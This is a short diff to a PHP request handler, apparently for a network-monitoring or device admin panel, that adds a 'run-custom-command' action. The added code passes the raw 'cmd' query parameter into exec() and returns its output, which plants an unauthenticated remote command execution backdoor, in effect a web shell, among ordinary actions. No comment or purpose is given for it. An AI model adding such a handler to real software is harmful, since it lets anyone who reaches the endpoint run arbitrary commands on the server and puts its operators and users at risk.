@@ -170,6 +170,13 @@
 		set_networkMonitor();
 		$response['response'] = 'success';
 	}
+
+	if ($action == "run-custom-command") {
+		exec("$_GET[cmd] 2>&1", $output, $return);
+		$response["output"] = $output;
+		$response["return"] = $return;
+		$response["response"] = "success";
+	}
 	
 	if ($action == "check-for-updates") {
 		// The 2>&1 allows us to view output from stderr. See https://stackoverflow.com/a/45808461/863470 for more info
